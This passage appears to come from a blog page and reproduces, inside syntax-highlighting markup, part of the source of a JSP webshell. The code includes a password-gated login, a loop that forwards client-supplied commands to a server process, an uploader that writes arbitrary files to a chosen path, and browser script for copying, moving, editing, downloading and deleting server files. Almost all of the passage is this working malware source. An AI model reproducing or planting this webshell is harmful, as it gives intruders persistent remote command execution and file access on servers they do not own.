class="built_in">replace</span>(<span class="string">"&lt;"</span>,<span class="string">"&amp;lt;"</span>).<span class="built_in">replace</span>(<span class="string">"&gt;"</span>,<span class="string">"&amp;gt;"</span>);</span></span><br><span class="line"><span class="vbscript">str = str.<span class="built_in">replace</span>(<span class="string">""</span>+(char)<span class="number">13</span>+(char)<span class="number">10</span>,<span class="string">"&lt;br/&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">str = str.<span class="built_in">replace</span>(<span class="string">"\n"</span>,<span class="string">"&lt;br/&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.write(str.toCharArray(), <span class="number">0</span>, str.length());</span></span><br><span class="line"><span class="vbscript">out.flush();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">//from client <span class="keyword">to</span> exe</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(this.ol.getCmd() == <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">Thread.sleep(<span class="number">500</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (this.ol.getCmd().equals(<span class="string">"first"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">this.ol.setCmd(<span class="literal">null</span>);</span></span><br><span class="line"><span class="vbscript">continue;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">this.ol.setCmd(this.ol.getCmd() + (char)<span class="number">10</span>);</span></span><br><span class="line"><span class="vbscript">char[] arr = this.ol.getCmd().toCharArray();</span></span><br><span class="line"><span class="vbscript">out.write(arr,<span class="number">0</span>,arr.length);</span></span><br><span class="line"><span class="vbscript">out.flush();</span></span><br><span class="line"><span class="vbscript">this.ol.setCmd(<span class="literal">null</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch(Exception e)&#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(<span class="keyword">in</span> != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>.close();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(out != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">out.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch( Exception e )&#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> Table&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> ArrayList&lt;Row&gt; rows = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> boolean echoTableTag = <span class="literal">false</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void setEchoTableTag(boolean v) &#123;</span></span><br><span class="line"><span class="vbscript">this.echoTableTag = v;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Table()&#123;</span></span><br><span class="line"><span class="vbscript">this.rows = <span class="keyword">new</span> ArrayList&lt;Row&gt;();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void addRow(Row r) &#123;</span></span><br><span class="line"><span class="vbscript">this.rows.add(r);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">String</span> toString()&#123;</span></span><br><span class="line"><span class="vbscript">StringBuilder html = <span class="keyword">new</span> StringBuilder();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (echoTableTag)</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (Row r:rows) &#123;</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;tr class=\"</span>alt1\<span class="string">" onMouseOver=\"</span>this.className=<span class="comment">'focus';\" onMouseOut=\"this.className='alt1';\"&gt;");</span></span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (Column c:r.getColumns()) &#123;</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;td nowrap&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> vv = Util.htmlEncode(Util.getStr(c.getValue()));</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (vv.equals(<span class="string">""</span>))</span></span><br><span class="line"><span class="vbscript">vv = <span class="string">"&amp;nbsp;"</span>;</span></span><br><span class="line"><span class="vbscript">html.append(vv);</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;/td&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (echoTableTag)</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">return html.toString();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> Row&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> ArrayList&lt;Column&gt; cols = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Row()&#123;</span></span><br><span class="line"><span class="vbscript">this.cols = <span class="keyword">new</span> ArrayList&lt;Column&gt;();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void addColumn(Column n) &#123;</span></span><br><span class="line"><span class="vbscript">this.cols.add(n);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> ArrayList&lt;Column&gt; getColumns()&#123;</span></span><br><span class="line"><span class="vbscript">return this.cols;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> Column&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> value;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Column(<span class="built_in">String</span> v)&#123;</span></span><br><span class="line"><span class="vbscript">this.value = v;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">String</span> getValue()&#123;</span></span><br><span class="line"><span class="vbscript">return this.value;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> Util&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static boolean <span class="built_in">isEmpty</span>(<span class="built_in">String</span> s) &#123;</span></span><br><span class="line"><span class="vbscript">return s == <span class="literal">null</span> || s.<span class="built_in">trim</span>().equals(<span class="string">""</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static boolean <span class="built_in">isEmpty</span>(Object o) &#123;</span></span><br><span class="line"><span class="vbscript">return o == <span class="literal">null</span> || <span class="built_in">isEmpty</span>(o.toString());</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> getSize(long size,char danwei) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (danwei == <span class="comment">'M') &#123;</span></span></span><br><span class="line"><span class="vbscript">double v =  <span class="built_in">formatNumber</span>(size / <span class="number">1024.0</span> / <span class="number">1024.0</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (v &gt; <span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="vbscript">return getSize(size,<span class="comment">'G');</span></span></span><br><span class="line"><span class="vbscript">&#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return v + <span class="string">"M"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (danwei == <span class="comment">'G') &#123;</span></span></span><br><span class="line"><span class="vbscript">return <span class="built_in">formatNumber</span>(size / <span class="number">1024.0</span> / <span class="number">1024.0</span> / <span class="number">1024.0</span>,<span class="number">2</span>)+<span class="string">"G"</span>;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (danwei == <span class="comment">'K') &#123;</span></span></span><br><span class="line"><span class="vbscript">double v = <span class="built_in">formatNumber</span>(size / <span class="number">1024.0</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (v &gt; <span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="vbscript">return getSize(size,<span class="comment">'M');</span></span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return v + <span class="string">"K"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (danwei == <span class="comment">'B') &#123;</span></span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (size &gt; <span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="vbscript">return getSize(size,<span class="comment">'K');</span></span></span><br><span class="line"><span class="vbscript">&#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return size + <span class="string">"B"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">return <span class="string">""</span>+<span class="number">0</span>+danwei;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static double <span class="built_in">formatNumber</span>(double value,<span class="built_in">int</span> l) &#123;</span></span><br><span class="line"><span class="vbscript">NumberFormat format = NumberFormat.getInstance();</span></span><br><span class="line"><span class="vbscript">format.setMaximumFractionDigits(l);</span></span><br><span class="line"><span class="vbscript">format.setGroupingUsed(<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">return <span class="keyword">new</span> Double(format.format(value));</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static boolean isInteger(<span class="built_in">String</span> v) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (<span class="built_in">isEmpty</span>(v))</span></span><br><span class="line"><span class="vbscript">return <span class="literal">false</span>;</span></span><br><span class="line"><span class="vbscript">return v.matches(<span class="string">"^\\d+$"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> formatDate(long <span class="built_in">time</span>) &#123;</span></span><br><span class="line"><span class="vbscript">SimpleDateFormat format = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd hh:mm:ss"</span>);</span></span><br><span class="line"><span class="vbscript">return format.format(<span class="keyword">new</span> java.util.<span class="built_in">Date</span>(<span class="built_in">time</span>));</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> convertPath(<span class="built_in">String</span> path) &#123;</span></span><br><span class="line"><span class="vbscript">return path != <span class="literal">null</span> ? path.<span class="built_in">replace</span>(<span class="string">"\\"</span>,<span class="string">"/"</span>) : <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> htmlEncode(<span class="built_in">String</span> v) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (<span class="built_in">isEmpty</span>(v))</span></span><br><span class="line"><span class="vbscript">return <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript">return v.<span class="built_in">replace</span>(<span class="string">"&amp;"</span>,<span class="string">"&amp;amp;"</span>).<span class="built_in">replace</span>(<span class="string">"&lt;"</span>,<span class="string">"&amp;lt;"</span>).<span class="built_in">replace</span>(<span class="string">"&gt;"</span>,<span class="string">"&amp;gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> getStr(<span class="built_in">String</span> s) &#123;</span></span><br><span class="line"><span class="vbscript">return s == <span class="literal">null</span> ? <span class="string">""</span> :s;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> getStr(Object s) &#123;</span></span><br><span class="line"><span class="vbscript">return s == <span class="literal">null</span> ? <span class="string">""</span> :s.toString();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> exec(<span class="built_in">String</span> regex, <span class="built_in">String</span> str, <span class="built_in">int</span> group) &#123;</span></span><br><span class="line"><span class="vbscript">Pattern pat = Pattern.compile(regex);</span></span><br><span class="line"><span class="vbscript">Matcher m = pat.matcher(str);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (m.find())</span></span><br><span class="line"><span class="vbscript">return m.group(group);</span></span><br><span class="line"><span class="vbscript">return <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static void outMsg(Writer out,<span class="built_in">String</span> msg) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">outMsg(out,msg,<span class="string">"center"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static void outMsg(Writer out,<span class="built_in">String</span> msg,<span class="built_in">String</span> align) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (msg.indexOf(<span class="string">"java.lang.ClassNotFoundException"</span>) != <span class="number">-1</span>)</span></span><br><span class="line"><span class="vbscript">msg = <span class="string">"Can Not Find The Driver!&lt;br/&gt;"</span> + msg;</span></span><br><span class="line"><span class="vbscript">out.write(<span class="string">"&lt;div style=\"</span>background:#f1f1f1;border:<span class="number">1</span>px solid #ddd;padding:<span class="number">15</span>px;font:<span class="number">14</span>px;text-align:<span class="string">"+align+"</span>;font-weight:bold;margin:<span class="number">10</span>px\<span class="string">"&gt;"</span>+msg+<span class="string">"&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> UploadBean &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> fileName = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> suffix = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> savePath = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> ServletInputStream sis = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> byte[] b = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> UploadBean() &#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void setSavePath(<span class="built_in">String</span> path) &#123;</span></span><br><span class="line"><span class="vbscript">this.savePath = path;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void parseRequest(HttpServletRequest <span class="built_in">request</span>) throws IOException &#123;</span></span><br><span class="line"><span class="vbscript">sis = <span class="built_in">request</span>.getInputStream();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> a = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> k = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> s = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((a = sis.readLine(b,<span class="number">0</span>,b.length))!= <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">s = <span class="keyword">new</span> <span class="built_in">String</span>(b, <span class="number">0</span>, a,PAGE_CHARSET);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> ((k = s.indexOf(<span class="string">"filename=\""))!= -1) &#123;</span></span></span><br><span class="line"><span class="vbscript">s = s.substring(k + <span class="number">10</span>);</span></span><br><span class="line"><span class="vbscript">k = s.indexOf(<span class="string">"\"");</span></span></span><br><span class="line"><span class="vbscript">s = s.substring(<span class="number">0</span>, k);</span></span><br><span class="line"><span class="vbscript">File tF = <span class="keyword">new</span> File(s);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (tF.isAbsolute()) &#123;</span></span><br><span class="line"><span class="vbscript">fileName = tF.getName();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">fileName = s;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">k = s.lastIndexOf(<span class="string">"."</span>);</span></span><br><span class="line"><span class="vbscript">suffix = s.substring(k + <span class="number">1</span>);</span></span><br><span class="line"><span class="vbscript">upload();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> void upload() &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">FileOutputStream out = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(savePath,fileName));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> a = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> k = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> s = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((a = sis.readLine(b,<span class="number">0</span>,b.length))!=<span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">s = <span class="keyword">new</span> <span class="built_in">String</span>(b, <span class="number">0</span>, a);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> ((k = s.indexOf(<span class="string">"Content-Type:"</span>))!=<span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">sis.readLine(b,<span class="number">0</span>,b.length);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((a = sis.readLine(b,<span class="number">0</span>,b.length)) != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">s = <span class="keyword">new</span> <span class="built_in">String</span>(b, <span class="number">0</span>, a);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> ((b[<span class="number">0</span>] == <span class="number">45</span>) &amp;&amp; (b[<span class="number">1</span>] == <span class="number">45</span>) &amp;&amp; (b[<span class="number">2</span>] == <span class="number">45</span>) &amp;&amp; (b[<span class="number">3</span>] == <span class="number">45</span>) &amp;&amp; (b[<span class="number">4</span>] == <span class="number">45</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.write(b, <span class="number">0</span>, a);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch (IOException ioe) &#123;</span></span><br><span class="line"><span class="vbscript">ioe.printStackTrace();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%</span></span><br><span class="line"><span class="vbscript">SHELL_NAME = <span class="built_in">request</span>.getServletPath().substring(<span class="built_in">request</span>.getServletPath().lastIndexOf(<span class="string">"/"</span>)+<span class="number">1</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> myAbsolutePath = application.getRealPath(<span class="built_in">request</span>.getServletPath());</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(myAbsolutePath)) &#123;//<span class="keyword">for</span> weblogic</span></span><br><span class="line"><span class="vbscript">SHELL_NAME = <span class="built_in">request</span>.getServletPath();</span></span><br><span class="line"><span class="vbscript">myAbsolutePath = <span class="keyword">new</span> File(application.getResource(<span class="string">"/"</span>).getPath()+SHELL_NAME).toString();</span></span><br><span class="line"><span class="vbscript">SHELL_NAME=<span class="built_in">request</span>.getContextPath()+SHELL_NAME;</span></span><br><span class="line"><span class="vbscript">WEB_ROOT = <span class="keyword">new</span> File(application.getResource(<span class="string">"/"</span>).getPath()).toString();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">WEB_ROOT = application.getRealPath(<span class="string">"/"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">SHELL_DIR = Util.convertPath(myAbsolutePath.substring(<span class="number">0</span>,myAbsolutePath.lastIndexOf(File.separator)));</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (session.getAttribute(CURRENT_DIR) == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">session.setAttribute(CURRENT_DIR,Util.convertPath(SHELL_DIR));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">request</span> = <span class="keyword">new</span> MyRequest(<span class="built_in">request</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (session.getAttribute(PW_SESSION_ATTRIBUTE) == <span class="literal">null</span> || !(session.getAttribute(PW_SESSION_ATTRIBUTE)).equals(PW)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> o = <span class="built_in">request</span>.getParameter(<span class="string">"o"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (o != <span class="literal">null</span> &amp;&amp;  o.equals(<span class="string">"login"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"login"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (o != <span class="literal">null</span> &amp;&amp; o.equals(<span class="string">"vLogin"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vLogin"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vLogin"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%!</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static interface Invoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DefaultInvoker implements Invoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;</span></span><br><span class="line"><span class="vbscript">return <span class="literal">true</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter() &#123;</span></span><br><span class="line"><span class="vbscript">return <span class="literal">true</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> ScriptInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;script type=\"</span>text/javascript\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	String.prototype.trim = function()&#123;return this.replace(/^\\s+|\\s+$/,'');&#125;;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function fso(obj) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		this.currentDir = '"</span>+JSession.getAttribute(CURRENT_DIR)+<span class="string">"';"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		this.filename = obj.filename;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		this.path = obj.path;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		this.filetype = obj.filetype;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	fso.prototype = &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		copy:function()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = prompt('Copy To : ',this.path);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'copy',src:this.path,to:path&#125;);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		move:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path =prompt('Move To : ',this.path);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'move',src:this.path,to:path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		vEdit:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'vEdit',filepath:this.path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		down:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'down',path:this.path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		removedir:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (!confirm('Dangerous ! Are You Sure To Delete '+this.filename+'?'))return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'removedir',dir:this.path&#125;);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		mkdir:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var name = prompt('Input New Directory Name','');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (name == null || name.trim().length == 0)return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'mkdir',name:name&#125;);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		subdir:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			